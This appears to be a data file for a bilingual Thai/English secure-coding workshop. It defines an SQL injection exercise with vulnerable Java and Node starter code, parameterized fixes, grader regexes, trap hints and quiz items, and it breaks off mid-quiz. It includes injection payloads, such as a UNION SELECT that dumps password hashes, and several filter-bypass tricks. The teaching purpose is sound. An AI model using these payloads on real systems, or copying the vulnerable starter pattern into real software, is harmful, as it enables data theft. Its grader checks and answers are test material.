/* ============================================================================
 * js/data/w1.js — Workshop 1: Injection & การตรวจสอบ Input
 *
 * 4 โจทย์: sql-injection, xss, command-injection, path-traversal
 * โครงสร้างตาม (ทุกข้อความที่ผู้เรียนเห็นเป็น { th, en })
 *
 * หมายเหตุสำหรับผู้ดูแลไฟล์นี้:
 * - โค้ดตัวอย่างอยู่ใน template literal ดังนั้น backtick, ${ และ backslash
 * ต้อง escape ให้ถูกต้อง
 * - Grader ตัด comment ออกก่อนตรวจเสมอ (ดู js/grader.js) regex จึงไม่ต้อง
 * กังวลว่าจะไปแมตช์กับคอมเมนต์ภาษาไทย
 * ==========================================================================*/
(function (global) {
  'use strict';

 /* ======================================================================
 * 1.1 SQL Injection
 * ==================================================================== */
  const SQL_INJECTION = {
    id: 'sql-injection',
    title: { th: 'SQL Injection', en: 'SQL Injection' },
    severity: 'Critical',
    cwe: 'CWE-89',
    owasp: 'A03:2021 – Injection',
    category: { th: 'Injection', en: 'Injection' },
    estMinutes: 14,
    points: 150,

    intro: {
      th: 'โค้ดประกอบคำสั่ง SQL ด้วยการเอาค่าที่ผู้ใช้ส่งมา (username จาก query string) มาต่อสตริงตรง ๆ database เลยได้รับ "คำสั่ง" กับ "ข้อมูล" ปนกันมาเป็นสตริงเดียว พอผู้ใช้ใส่เครื่องหมาย \' เข้ามา มันก็ปิด string literal ของคุณแล้วส่วนที่เหลือกลายเป็น syntax SQL ที่ database รันจริง attacker เลยเขียนเงื่อนไขเอง ต่อ UNION หรือเรียก subquery ได้ตามใจ ทั้งที่ไม่มีบัญชีในระบบสักอัน',
      en: 'The code builds its SQL by concatenating a user-controlled value (the username from the query string) into the statement. The database therefore receives command and data mixed into a single string, so the moment a user sends a \' character it terminates your string literal and the rest becomes SQL syntax the engine really executes. An attacker can write their own conditions, append a UNION, or run subqueries — without owning an account on your system.'
    },
    attack: {
      th: 'ยิง q=\' OR \'1\'=\'1 ทำให้ WHERE เป็นจริงเสมอ ดึงผู้ใช้กลับมาครบทั้ง 4,812 ราย ยกระดับต่อด้วย q=\' UNION SELECT id, username, password_hash FROM users -- เพื่อดึงคอลัมน์ที่ endpoint นี้ไม่เคยตั้งใจเปิด หรือ q=admin\'-- เพื่อตัดเงื่อนไขที่เหลือทิ้งแล้วล็อกอินเป็น admin',
      en: 'Send q=\' OR \'1\'=\'1 to make the WHERE clause always true and get all 4,812 users back. Escalate with q=\' UNION SELECT id, username, password_hash FROM users -- to pull columns this endpoint was never meant to expose, or q=admin\'-- to comment away the rest of the condition and authenticate as admin.'
    },
    fix: {
      th: 'ใช้ parameterized query: ส่งคำสั่ง SQL ที่มี placeholder (?) ไปให้ database แยกคนละช่องทางกับค่า parameter database จะ parse แล้ววาง execution plan จากตัวคำสั่งก่อน ค่อยผูกค่าเข้าไปทีหลังในฐานะข้อมูลล้วน ๆ กลไกนี้ทำให้ attacker แทรก syntax ไม่ได้เลย ไม่ใช่เพราะเรากรองอักขระเก่ง แต่เพราะค่าที่ส่งไปไม่เคยแตะ parser ของ SQL',
      en: 'Use a parameterized query: send the SQL text with placeholders (?) to the database over a separate channel from the parameter values. The engine parses the statement and builds its execution plan first, then binds the values afterwards strictly as data. Injection becomes impossible not because you filtered characters cleverly, but because the value never reaches the SQL parser at all.'
    },
    keyPoints: {
      vuln: [
        { th: 'เขียน code โดยการนำ SQL + เข้ากับ String ทำให้คำสั่งและข้อมูลปนกันเป็น String 1 ค่า', en: 'The code concatenates the username into the SQL, mixing command and data into one string.' },
        { th: 'string literal ถูกปิดด้วยเครื่องหมาย \' แล้วส่วนที่เหลือกลายเป็น SQL จริง', en: 'A \' from the user closes the string literal and the rest becomes SQL the engine runs.' },
        { th: 'attacker ไม่ต้องมีบัญชีในระบบก็เขียน SQL injection จากหน้าเว็บได้', en: 'An attacker needs no account to add their own conditions or append a UNION.' }
      ],
      attack: [
        { th: 'attacker แทรกคำสั่ง SQL ผ่านช่องค้นหา เช่น \' OR \'1\'=\'1 ทำให้เงื่อนไขการค้นหาเป็นจริงกับข้อมูลทั้งหมด และระบบแสดงข้อมูลที่ไม่ควรถูกเปิดเผย', en: 'Send q=\' OR \'1\'=\'1 to make WHERE always true and get all 4,812 users back.' },
        { th: 'attacker ใช้ UNION SELECT เพื่อผนวกผลจาก query อื่นเข้ากับผลการค้นหาปกติ ทำให้ดึงคอลัมน์อย่าง password_hash ที่ฟังก์ชันปกติไม่ได้เปิดให้ดูออกมาได้', en: 'Append UNION SELECT ... password_hash to pull columns this endpoint never exposed.' }
      ],
      fix: [
        { th: 'ใช้ parameterized query (prepared statement) โดยแยกคำสั่ง SQL ออกจากค่าที่ผู้ใช้กรอก และไม่ต่อ input ของผู้ใช้รวมเข้าไปในคำสั่ง SQL โดยตรง', en: 'Use a parameterized query (prepared statement): keep the SQL statement separate from the values the user typed, and never concatenate user input into the statement.' },
        { th: 'database จะประมวลผลโครงสร้างของ SQL ก่อน แล้วค่อยนำค่าที่ผู้ใช้ส่งมาไปผูกกับ parameter ทำให้ค่านั้นถูกมองเป็นข้อมูลเท่านั้น ไม่ใช่ส่วนหนึ่งของคำสั่ง SQL', en: 'The database parses the SQL structure first, then binds the submitted values into the declared parameters, so those values are treated only as data, never as SQL.' },
        { th: 'แม้ค่าที่ผู้ใช้กรอกจะมีอักขระหรือคำพิเศษ เช่น \' หรือ OR database ก็ยังมองเป็นข้อมูลหนึ่งค่า จึงไม่สามารถใช้เปลี่ยนเงื่อนไขของ query ได้', en: 'So even when the user submits characters that are meaningful in SQL, such as \' or OR, they are never read as part of the statement and cannot alter the query conditions.' }
      ]
    },
    impact: {
      th: 'attacker สามารถเข้าถึงข้อมูลที่ไม่ได้รับอนุญาต เช่น ชื่อ อีเมล หรือ password hash และในบางกรณีอาจต่อยอดไปถึงการแก้ไขข้อมูล เขียนไฟล์ หรือรันคำสั่งบน server ของ database ได้',
      en: 'An attacker can dump your entire customer table — names, emails, password hashes — in minutes with automated tooling, and in many setups pivot from there to writing files or running commands on the database host.'
    },

    caseStudy: {
      year: 2008,
      title: {
        th: 'Heartland Payment Systems — SQL injection สู่การขโมยข้อมูลบัตรกว่า 130 ล้านใบ',
        en: 'Heartland Payment Systems — SQL injection leading to 130+ million stolen cards'
      },
      body: {
        th: 'ในคำฟ้องปี 2009 กระทรวงยุติธรรมสหรัฐฯ ระบุว่ากลุ่มของ Albert Gonzalez ใช้ SQL injection เจาะเครือข่ายของ Heartland Payment Systems (ผู้ประมวลผลบัตร), 7-Eleven และ Hannaford Brothers ช่วงราวปี 2006–2008 แล้วขโมยข้อมูลบัตรเครดิต/เดบิตรวมกว่า 130 ล้านใบ ส่งออกไปยัง server ในหลายประเทศ Gonzalez ถูกตัดสินจำคุก 20 ปีเมื่อเดือนมีนาคม 2010 จุดเริ่มของเหตุการณ์ระดับนี้คือฟอร์มค้นหาเว็บธรรมดา ๆ ที่นำ input มาต่อสตริงเข้ากับ SQL',
        en: 'In its 2009 indictment the U.S. Department of Justice alleged that Albert Gonzalez and his co-conspirators used SQL injection to breach the networks of card processor Heartland Payment Systems, 7-Eleven and Hannaford Brothers from roughly 2006 to 2008, stealing data on more than 130 million credit and debit cards and exfiltrating it to servers in several countries. Gonzalez was sentenced to 20 years in prison in March 2010. The entry point for an incident of that scale was an ordinary web form that concatenated input into SQL.'
      },
      source: {
        label: 'U.S. DOJ — Alleged International Hacker Indicted for Massive Attack on U.S. Retail and Banking Networks (2009)',
        url: 'https://www.justice.gov/archives/opa/pr/alleged-international-hacker-indicted-massive-attack-us-retail-and-banking-networks'
      }
    },

    codeReview: [
      {
        th: 'ถ้าเจอ createStatement() หรือ executeQuery(sql) ที่ sql ถูกประกอบขึ้นเอง ให้ตรวจว่ามีค่าจากผู้ใช้ถูกต่อเข้าไปหรือไม่ ถ้ามี นั่นคือจุดเสี่ยง SQL Injection',
        en: 'Any createStatement() or executeQuery(sql) that takes an assembled string — trace immediately whether user input got into that string.'
      },
      {
        th: 'ถ้าเห็น + ตัวแปร หรือ ${...} อยู่ในสตริงที่มี SELECT/INSERT/UPDATE/DELETE/WHERE ให้ตรวจทันทีว่าตัวแปรนั้นมาจากผู้ใช้หรือไม่ เพราะอาจทำให้ข้อมูลกลายเป็นส่วนหนึ่งของคำสั่ง SQL',
        en: 'grep for a + adjacent to a variable inside a SQL string, or a template literal containing ${...} anywhere near SELECT/INSERT/UPDATE/DELETE/WHERE.'
      },
      {
        th: 'String.format, MessageFormat, .formatted() หรือการ join สตริงเพื่อสร้าง SQL ยังถือเป็นการประกอบคำสั่งเหมือนกัน และ %s ไม่ได้ป้องกัน SQL Injection ให้',
        en: 'String.format, MessageFormat.format, .formatted(), and joining strings to build SQL — these are all string concatenation wearing a disguise.'
      }],

    testIt: {
      cmd: "curl -s -G 'http://localhost:8080/admin/customers' --data-urlencode \"q=' OR '1'='1\""
    },

    pitfalls: [
      {
        title: {
          th: 'escape เครื่องหมาย \' หรือบล็อกคำว่า OR / UNION',
          en: '"I escape quotes and block the words OR and UNION"'
        },
        why: {
          th: 'คุณกำลังเขียน SQL parser แข่งกับคนทำ database และคุณจะแพ้ ค่าที่เป็นตัวเลขไม่ต้องใช้ quote เลย (id=1 OR 1=1 ทำงานได้โดยไม่มี \' สักตัว) คำว่า OR เลี่ยงได้ด้วย || หรือ /**/OR/**/ ส่วน UNION เลี่ยงด้วย UnIoN และในบาง charset (เช่น GBK) การเติม backslash หน้า quote กลับสร้างอักขระใหม่ที่คืน quote ให้ attacker ที่สำคัญที่สุด: denylist ต้องถูกทุกครั้ง แต่ attacker ขอถูกแค่ครั้งเดียว',
          en: 'You are writing a SQL parser in competition with the database vendor, and you will lose. Numeric contexts need no quotes at all (id=1 OR 1=1 works without a single \'), OR can be written || or /**/OR/**/, UNION can be written UnIoN, and in some character sets (GBK, for example) backslash-escaping a quote produces a new character that hands the quote back to the attacker. Most importantly: a denylist has to be right every time, an attacker only has to be right once.'
        },
        short: {
          th: 'การกรองอักขระหรือคำต้องห้ามหลบได้หลายแบบ ใช้ parameterized query เพื่อแยกข้อมูลออกจากคำสั่งตั้งแต่ต้น',
          en: 'A denylist always loses; parameterize instead of filtering characters.'
        }
      },
      {
        title: {
          th: 'คิดว่าใช้ ORM แล้วจะกัน SQL Injection ให้เองทั้งหมด',
          en: '"We use Hibernate/Sequelize — the ORM makes us safe"'
        },
        why: {
          th: 'ORM ปลอดภัยเฉพาะตอนที่คุณให้ ORM สร้าง query เอง แต่ทันทีที่คุณเขียน @Query("... WHERE u.name = \'" + name + "\'"), em.createNativeQuery(sql), sequelize.query(sql), knex.raw(sql) หรือ repository.find({ where: literal(...) }) คุณกลับไปต่อสตริงเหมือนเดิมทุกประการ ช่องโหว่ SQL injection ในโปรเจกต์ที่ใช้ ORM ส่วนใหญ่อยู่ในไม่กี่บรรทัดที่ "จำเป็นต้องเขียน SQL เอง" นั่นแหละ — ใช้ named parameter (:name) หรือ binding array กับทุก raw query',
          en: 'An ORM is safe only while the ORM builds the query. The moment you write @Query("... WHERE u.name = \'" + name + "\'"), em.createNativeQuery(sql), sequelize.query(sql), knex.raw(sql) or repository.find({ where: literal(...) }), you are back to plain string concatenation. Most SQL injection bugs in ORM-based projects live in exactly those few lines where "we had to hand-write the SQL" — use named parameters (:name) or a bindings array on every raw query.'
        },
        short: {
          th: 'ORM ช่วยเมื่อใช้ API ของ ORM ตามปกติ แต่ถ้าเขียน SQL เองแล้วต่อค่าจากผู้ใช้เข้าไป ก็ยังเกิด SQL Injection ได้',
          en: 'Every raw query in an ORM still needs named parameters or a bindings array.'
        }
      },
      {
        title: {
          th: 'ใช้ stored procedure แล้วคิดว่าปลอดภัยเสมอ',
          en: '"I moved it into a stored procedure, so it is safe"'
        },
        why: {
          th: 'stored procedure ปลอดภัยก็ต่อเมื่อข้างในใช้ bind variable ถ้าโพรซีเดอร์สร้างสตริงแล้วเรียก EXECUTE IMMEDIATE / sp_executesql / PREPARE ด้วยค่าที่ต่อเข้ามา ช่องโหว่ก็แค่ย้ายจากโค้ดแอปไปอยู่ใน database ซึ่งตรวจเจอยากกว่าเดิมและมักรันด้วย privilege ที่สูงกว่า',
          en: 'A stored procedure is safe only if it uses bind variables inside. If the procedure assembles a string and calls EXECUTE IMMEDIATE / sp_executesql / PREPARE with concatenated values, you have simply relocated the vulnerability from the application into the database — where it is harder to spot and usually runs with higher privileges.'
        },
        short: {
          th: 'stored procedure ยังเกิด SQL Injection ได้ ถ้าภายในนำค่าจากผู้ใช้ไปต่อเป็นคำสั่ง SQL แบบ dynamic',
          en: 'A stored procedure is safe only if it uses bind variables inside.'
        }
      }
    ],

    languages: {
      java: {
        filename: 'CustomerSearchRepository.java',
        lang: 'java',
        starter:
`package com.acme.crm.repo;

import java.sql.*;
import java.util.ArrayList;
import java.util.List;
import javax.sql.DataSource;

/** ค้นหาลูกค้าสำหรับหน้า back-office */
public class CustomerSearchRepository {

    private final DataSource ds;

    public CustomerSearchRepository(DataSource ds) {
        this.ds = ds;
    }

 // username มาจาก query string ของหน้าค้นหา: /admin/customers?q=...
    public List<Customer> findByUsername(String username) throws SQLException {
        List<Customer> out = new ArrayList<>();
        String sql = "SELECT id, username, email FROM users "
                   + "WHERE username = '" + username + "' AND active = 1";
        try (Connection conn = ds.getConnection();
             Statement stmt = conn.createStatement();
             ResultSet rs = stmt.executeQuery(sql)) {
            while (rs.next()) {
                out.add(Customer.from(rs));
            }
        }
        return out;
    }
}`,
        solution:
`package com.acme.crm.repo;

import java.sql.*;
import java.util.ArrayList;
import java.util.List;
import javax.sql.DataSource;

public class CustomerSearchRepository {

 // คำสั่ง SQL เป็นค่าคงที่ ไม่มีส่วนใดมาจากผู้ใช้
    private static final String SQL =
        "SELECT id, username, email FROM users WHERE username = ? AND active = 1";

    private final DataSource ds;

    public CustomerSearchRepository(DataSource ds) {
        this.ds = ds;
    }

    public List<Customer> findByUsername(String username) throws SQLException {
        List<Customer> out = new ArrayList<>();
        try (Connection conn = ds.getConnection();
             PreparedStatement stmt = conn.prepareStatement(SQL)) {
 // ค่าเดินทางแยกช่องทางจากคำสั่ง จึงไม่ถูก parse เป็น SQL
            stmt.setString(1, username);
            try (ResultSet rs = stmt.executeQuery()) {
                while (rs.next()) {
                    out.add(Customer.from(rs));
                }
            }
        }
        return out;
    }
}`,
        explain: {
          th: 'SQL ถูกกำหนดเป็น final String ที่มี ? เป็น placeholder จากนั้น JDBC ส่งโครงสร้างคำสั่งให้ database ประมวลผลก่อน แล้ว setString(1, username) จึงผูกค่าผู้ใช้เข้า parameter แยกจากตัวคำสั่ง ต่อให้ username เป็น \' OR \'1\'=\'1 database ก็จะมองทั้งหมดเป็นชื่อผู้ใช้หนึ่งค่า ไม่ใช่เงื่อนไข SQL เพิ่มเติม',
          en: 'The SQL is now a constant final String that can never change shape. JDBC hands that statement text to the database to parse and plan first; setString(1, username) then ships the value to the placeholder over the binary protocol, separate from the statement text. Even when username is \' OR \'1\'=\'1, the database sees one username value containing odd characters and returns 0 rows — never a condition.'
        },
        checks: [
          {
            id: 'no-sql-concat',
            label: { th: 'ไม่ต่อค่า username เข้ากับสตริง SQL', en: 'The username is never concatenated into the SQL string' },
            hint: { th: 'ลบ + username + ออกจากสตริง SQL แล้วใส่ ? แทนตำแหน่งนั้น', en: 'Remove + username + from the SQL string and put a ? in that position' },
            weight: 3,
            mustNotMatch: /\+\s*username\b|\busername\s*\+/
          },
          {
            id: 'no-create-statement',
            label: { th: 'ไม่ใช้ Statement ธรรมดา (createStatement)', en: 'No plain Statement (createStatement)' },
            hint: { th: 'เปลี่ยน conn.createStatement() เป็น conn.prepareStatement(SQL)', en: 'Replace conn.createStatement() with conn.prepareStatement(SQL)' },
            weight: 2,
            mustNotMatch: /createStatement\s*\(/
          },
          {
            id: 'use-prepared-statement',
            label: { th: 'ใช้ PreparedStatement หรือ NamedParameterJdbcTemplate', en: 'Uses PreparedStatement or NamedParameterJdbcTemplate' },
            hint: { th: 'สร้างคำสั่งด้วย conn.prepareStatement(SQL) แล้วเก็บไว้ใน try-with-resources', en: 'Create the statement with conn.prepareStatement(SQL) inside try-with-resources' },
            weight: 2,
            mustMatch: /prepareStatement\s*\(|NamedParameterJdbcTemplate|jdbcTemplate\s*\.\s*quer/
          },
          {
            id: 'sql-placeholder',
            label: { th: 'คำสั่ง SQL ใช้ placeholder (? หรือ :name)', en: 'The SQL uses a placeholder (? or :name)' },
            hint: { th: 'เขียนเงื่อนไขเป็น WHERE username = ? แทนการฝังค่าลงไป', en: 'Write the condition as WHERE username = ? instead of embedding the value' },
            weight: 1,
            mustMatch: /=\s*\?|:\s*username\b/
          },
          {
            id: 'bind-parameter',
            label: { th: 'ผูกค่าด้วย setString()/addValue() ไม่ใช่ฝังลงข้อความคำสั่ง', en: 'Binds the value with setString()/addValue() rather than embedding it' },
            hint: { th: 'เรียก stmt.setString(1, username) ก่อน executeQuery()', en: 'Call stmt.setString(1, username) before executeQuery()' },
            weight: 2,
            mustMatch: /\.set(?:String|Int|Long|Object|Boolean|Date|Timestamp)\s*\(|addValue\s*\(/
          }
        ],
        traps: [
          {
            id: 'escape-quotes-manually',
            match: /\.replace(?:All|First)?\s*\(\s*"'"/,
            message: {
              th: 'คุณกำลัง escape เครื่องหมาย \' ด้วยมือ วิธีนี้ไม่ปลอดภัย: ฟิลด์ที่เป็นตัวเลขไม่ต้องใช้ quote เลย (1 OR 1=1), บาง charset ทำให้ backslash ถูกกลืนจนคืน quote ให้ attacker และคุณต้องแก้ให้ถูกทุกจุดทุกครั้ง ให้ใช้ PreparedStatement + ? แทน แล้วปัญหานี้หายไปทั้งคลาส',
              en: 'You are hand-escaping the \' character. That is not safe: numeric fields need no quotes at all (1 OR 1=1), some character sets swallow your backslash and hand the quote back to the attacker, and you must get it right at every single call site. Use PreparedStatement with ? instead and the entire class of bug disappears.'
            }
          },
          {
            id: 'keyword-denylist',
            match: /(?:contains|indexOf|matches|replaceAll)\s*\(\s*"[^"]*(?:\bOR\b|UNION|SELECT|DROP|--)/i,
            message: {
              th: 'การบล็อกคำอย่าง OR / UNION / -- เป็น denylist ที่เลี่ยงได้ง่ายมาก: OR เขียนเป็น || ได้, UnIoN ผ่านการเช็คแบบ case-sensitive, /**/ แทรกกลางคำได้, และ inline comment ของ MySQL อย่าง /*!50000UNION*/ ก็ยังทำงาน ลบ denylist ทิ้งแล้ว parameterize ให้หมด',
              en: 'Blocking words like OR / UNION / -- is a denylist and it is trivially bypassed: OR can be written ||, UnIoN slips past a case-sensitive check, /**/ can be injected mid-keyword, and MySQL versioned comments such as /*!50000UNION*/ still execute. Delete the denylist and parameterize instead.'
            }
          },
          {
            id: 'string-format-sql',
            match: /String\.format\s*\(\s*"[^"]*\b(?:SELECT|INSERT|UPDATE|DELETE|WHERE)\b|"[^"]*\b(?:SELECT|INSERT|UPDATE|DELETE|WHERE)\b[^"]*"\s*\.formatted\s*\(|MessageFormat\.format\s*\(\s*"[^"]*\b(?:SELECT|WHERE)\b/i,
            message: {
              th: 'String.format /.formatted() / MessageFormat ก็ยังสร้างสตริง SQL หนึ่งก้อนที่มีค่าจากผู้ใช้อยู่ข้างใน — database ได้รับคำสั่งกับข้อมูลปนกันเหมือนเดิมทุกอย่าง %s ไม่ได้ escape อะไรให้เลย ต้องใช้ ? คู่กับ setString() เท่านั้น',
              en: 'String.format / .formatted() / MessageFormat still produce one SQL string with the user value baked in — the database receives command and data mixed exactly as before. %s escapes nothing. You need ? plus setString().'
            }
          }
        ]
      },

      node: {
        filename: 'customerRepository.js',
        lang: 'js',
        starter:
`const db = require('./db'); // mysql2/promise connection pool

// GET /admin/customers?q=... — หน้าค้นหาลูกค้าในระบบหลังบ้าน
async function findByUsername(username) {
  const sql =
    "SELECT id, username, email FROM users " +
    "WHERE username = '" + username + "' AND active = 1";
  const [rows] = await db.query(sql);
  return rows;
}

module.exports = { findByUsername };`,
        solution:
`const db = require('./db'); // mysql2/promise connection pool

// คำสั่ง SQL เป็นค่าคงที่ ไม่มีส่วนใดมาจากผู้ใช้
const SQL =
  'SELECT id, username, email FROM users WHERE username = ? AND active = 1';

async function findByUsername(username) {
 // execute() ใช้ prepared statement จริงฝั่ง server ค่าถูกส่งแยกจากคำสั่ง
  const [rows] = await db.execute(SQL, [username]);
  return rows;
}

module.exports = { findByUsername };`,
        explain: {
          th: 'กำหนด SQL เป็นค่าคงที่ที่ไม่มี input ของผู้ใช้ปนอยู่ แล้วส่ง [username] แยกเป็น argument ให้ db.execute() ค่า username จะถูกผูกกับ ? เป็นข้อมูล ไม่ได้ถูกนำไป parse เป็นส่วนหนึ่งของ SQL ดังนั้นข้อความอย่าง \' OR \'1\'=\'1 จึงไม่สามารถเปลี่ยนโครงสร้างของ query ได้',
          en: 'The SQL string is lifted into a constant with no variables inside it, and [username] is passed as the second argument to db.execute(). In mysql2, execute() issues a server-side PREPARE and binds the value to the ? over the binary protocol (query() escapes client-side instead, which is also safe with placeholders, but execute() gives a stronger separation). The point is that the username value never passes through a SQL parser.'
        },
        checks: [
          {
            id: 'no-sql-concat',
            label: { th: 'ไม่ต่อค่า username เข้ากับสตริง SQL ด้วย +', en: 'The username is never concatenated into the SQL with +' },
            hint: { th: 'ลบ + username + ออก แล้วใส่ ? ไว้ในตำแหน่งนั้นแทน', en: 'Remove + username + and put a ? in that position instead' },
            weight: 3,
            mustNotMatch: /\+\s*username\b|\busername\s*\+/
          },
          {
            id: 'no-template-interpolation',
            label: { th: 'ไม่ฝังค่าลงสตริง SQL ด้วย template literal', en: 'No template-literal interpolation inside the SQL string' },
            hint: { th: 'อย่าเขียน `... username = \'${username}\'` — ให้ใช้ ? กับ parameter array', en: 'Do not write `... username = \'${username}\'` — use ? with a parameter array' },
            weight: 2,
            mustNotMatch: /\$\{[^}]*\b(?:username|req\.query|req\.body|req\.params)\b[^}]*\}/
          },
          {
            id: 'sql-placeholder',
            label: { th: 'คำสั่ง SQL ใช้ placeholder (? หรือ :name)', en: 'The SQL uses a placeholder (? or :name)' },
            hint: { th: 'เขียนเงื่อนไขเป็น WHERE username = ?', en: 'Write the condition as WHERE username = ?' },
            weight: 1,
            mustMatch: /=\s*\?|:\s*username\b/
          },
          {
            id: 'bind-parameter-array',
            label: { th: 'ส่งค่าเป็น parameter array ให้ execute()/query()', en: 'Passes the value as a parameter array to execute()/query()' },
            hint: { th: 'เรียก db.execute(SQL, [username]) — ค่าอยู่ใน argument ตัวที่สอง', en: 'Call db.execute(SQL, [username]) — the value goes in the second argument' },
            weight: 2,
            mustMatch: /\b(?:execute|query)\s*\([^,()]*,\s*\[/
          }
        ],
        traps: [
          {
            id: 'escape-quotes-manually',
            match: /\.replace(?:All)?\s*\(\s*(?:\/'\/[gimsuy]*|['"]'['"])/,
            message: {
              th: 'การ replace เครื่องหมาย \' เองไม่ได้ทำให้ปลอดภัย: ฟิลด์ตัวเลขไม่ต้องใช้ quote (id=1 OR 1=1), backslash ในบาง charset ทำให้ quote หลุด และคุณต้องทำถูกทุกจุด ให้ส่งค่าเป็น parameter array แทน — mysql2 จะจัดการ escaping/binding ให้เองอย่างถูกต้อง',
              en: 'Replacing the \' character yourself does not make this safe: numeric fields need no quotes (id=1 OR 1=1), a backslash in some character sets lets the quote escape anyway, and you must get it right at every call site. Pass the value as a parameter array instead and let mysql2 handle escaping/binding correctly.'
            }
          },
          {
            id: 'keyword-denylist',
            match: /\b(?:includes|indexOf|search)\s*\(\s*['"][^'"]*(?:\bOR\b|UNION|SELECT|DROP|--)/i,
            message: {
              th: 'denylist คำว่า OR / UNION / -- เลี่ยงได้ง่าย (|| แทน OR, UnIoN แทน UNION, /**/ แทรกกลางคำ) และยังบล็อกชื่อจริงของผู้ใช้ที่มีคำเหล่านั้นอยู่ด้วย ให้ลบทิ้งแล้วใช้ placeholder',
              en: 'A denylist of OR / UNION / -- is easy to bypass (|| for OR, UnIoN for UNION, /**/ injected mid-keyword) and it also blocks legitimate names containing those letters. Delete it and use placeholders.'
            }
          },
          {
            id: 'raw-query-template-literal',
            match: /\.(?:query|raw|literal)\s*\(\s*`[^`]*\$\{/,
            message: {
              th: 'raw query ที่รับ template literal พร้อม ${...} คือ string concatenation ที่ ORM ไม่ได้ช่วยอะไรเลย — sequelize.query, knex.raw และ createNativeQuery ทุกตัวรับ bindings ได้ ให้ย้ายค่าไปไว้ใน replacements/bindings array แทน',
              en: 'A raw query taking a template literal with ${...} is plain string concatenation that the ORM does nothing about — sequelize.query, knex.raw and createNativeQuery all accept bindings. Move the value into the replacements/bindings array.'
            }
          }
        ]
      }
    },

    hints: [
      {
        th: 'ลองถามว่า "คำสั่ง SQL กับค่าจากผู้ใช้ถูกส่งแยกจากกันหรือยัง" ถ้ายังถูกประกอบเป็นสตริงเดียวกัน แปลว่ายังมีความเสี่ยง SQL Injection',
        en: 'Ask yourself how many pieces of text the database receives. If the user value is in the same piece as the command, the fix is not done.'
      },
      {
        th: 'ลองแยก SQL ออกมาเป็นค่าคงที่ เช่น final String หรือ const ถ้ายังต้องแทรกตัวแปรจากผู้ใช้ลงในสตริง SQL แปลว่าจุดนั้นควรเปลี่ยนไปใช้ parameter',
        en: 'First make the SQL a constant (lift it into a final String / const). If that no longer compiles, the place it breaks is exactly where input is leaking into the command.'
      },
      {
        th: 'Java: conn.prepareStatement(SQL) + WHERE username = ? + stmt.setString(1, username) — Node (mysql2): db.execute(SQL, [username]) โดย SQL มี ? อยู่ในเงื่อนไข',
        en: 'Java: conn.prepareStatement(SQL) + WHERE username = ? + stmt.setString(1, username). Node (mysql2): db.execute(SQL, [username]) with a ? in the SQL condition.'
      }
    ],

    quiz: [
      {
        q: {
          th: 'ทีมเปลี่ยนจากการต่อสตริงมาเป็น String.format("SELECT * FROM users WHERE username = \'%s\'", username) แล้วบอกว่าปลอดภัยแล้ว ถูกต้องหรือไม่',
          en: 'A team replaces string concatenation with String.format("SELECT * FROM users WHERE username = \'%s\'", username) and calls it fixed. Are they right?'
        },
        choices: [
          { th: 'ปลอดภัยแล้ว เพราะ String.format ตรวจชนิดข้อมูลและ escape ค่าที่ใส่เข้ามาให้', en: 'Yes — String.format type-checks and escapes the values it substitutes' },
          { th: 'ยังไม่ปลอดภัย เพราะผลลัพธ์ยังเป็นสตริง SQL ก้อนเดียวที่มีค่าจากผู้ใช้อยู่ข้างใน', en: 'No — the result is still one SQL string with the user value baked into it' },
          { th: 'ปลอดภัยแล้ว ถ้าเปลี่ยน %s เป็น %d เพื่อบังคับให้เป็นตัวเลข', en: 'Yes, as long as you use %d instead of %s to force a number' },
          { th: 'ปลอดภัยแล้ว ถ้า escape เครื่องหมาย \' ก่อนส่งเข้า String.format', en: 'Yes, as long as you escape the \' character before passing it to String.format' }
        ],
        answer: 1,
        why: {
          th: 'ปัญหาไม่ได้อยู่ที่ตัวดำเนินการ + แต่อยู่ที่ "ค่าจากผู้ใช้ถูกส่งไปให้ SQL parser" String.format เป็นแค่วิธีต่อสตริงอีกแบบ ค่าที่ได้จึงยังเป็นคำสั่งกับข้อมูลปนกัน วิธีเดียวที่แก้ได้จริงคือส่งค่าแยกช่องทางผ่าน placeholder',
          en: 'The problem was never the + operator; it is that the user value reaches the SQL parser. String.format is just another way to concatenate, so command and data stay mixed. The only real fix is sending the value over a separate channel via a placeholder.'
        },
        whyWrong: [
          { th: 'String.format ไม่รู้จัก SQL เลย มันแทนที่ %s ด้วยข้อความดิบ ๆ ไม่มีการ escape ใด ๆ ทั้งสิ้น', en: 'String.format knows nothing about SQL. It substitutes %s with the raw text and performs no escaping whatsoever.' },
          null,
          { th: '%d ช่วยได้เฉพาะเมื่อค่านั้นเป็นตัวเลขอยู่แล้ว ถ้าคุณ parse เป็น int ได้ก่อนก็ควรทำ แต่ฟิลด์ข้อความอย่าง username ใช้ %d ไม่ได้ และมันไม่ได้แก้รูปแบบที่ผิดของการสร้าง query', en: '%d only helps when the value already is a number — if you can parse it to an int first, do so, but a text field like username cannot use %d, and it does not fix the underlying pattern of building the query as text.' },
          { th: 'การ escape เองยังพลาดได้ทั้งใน context ที่ไม่มี quote (ตัวเลข) และใน charset ที่ทำให้ backslash ถูกกลืน อีกทั้งต้องทำถูกทุกจุดตลอดไป', en: 'Hand-escaping still fails in unquoted (numeric) contexts and in character sets that swallow the backslash, and it has to be done correctly at every call site forever.' }
        ]
      },
      {
        q: {
          th: 'โปรเจกต์ใช้ Spring Data JPA อยู่แล้ว โค้ดข้อใดยังถูก SQL/JPQL injection ได้',
          en: 'The project already uses Spring Data JPA. Which of these is still injectable?'
        },
        choices: [
          { th: 'userRepository.findByUsername(username) — derived query ที่ Spring สร้างให้เอง', en: 'userRepository.findByUsername(username) — a derived query generated by Spring' },
          { th: '@Query("SELECT u FROM User u WHERE u.username = :name") พร้อม @Param("name") String name', en: '@Query("SELECT u FROM User u WHERE u.username = :name") with @Param("name") String name' },
          { th: 'em.createQuery("SELECT u FROM User u WHERE u.username = \'" + username + "\'")', en: 'em.createQuery("SELECT u FROM User u WHERE u.username = \'" + username + "\'")' },
          { th: 'em.createNativeQuery("SELECT * FROM users WHERE username = ?1").setParameter(1, username)', en: 'em.createNativeQuery("SELECT * FROM users WHERE username = ?1").setParameter(1, username)' }
        ],
        answer: 2,
        why: {
          th: 'ข้อนี้ต่อสตริงเข้ากับ JPQL ตรง ๆ Hibernate จะ parse ข้อความทั้งก้อนเป็นคำสั่ง attacker เลยแทรก syntax JPQL ได้ (ถ้าเป็น native query ก็แทรก SQL ได้เต็ม ๆ) มี ORM ก็ไม่ได้ช่วยอะไรเมื่อคุณประกอบข้อความคำสั่งเอง',
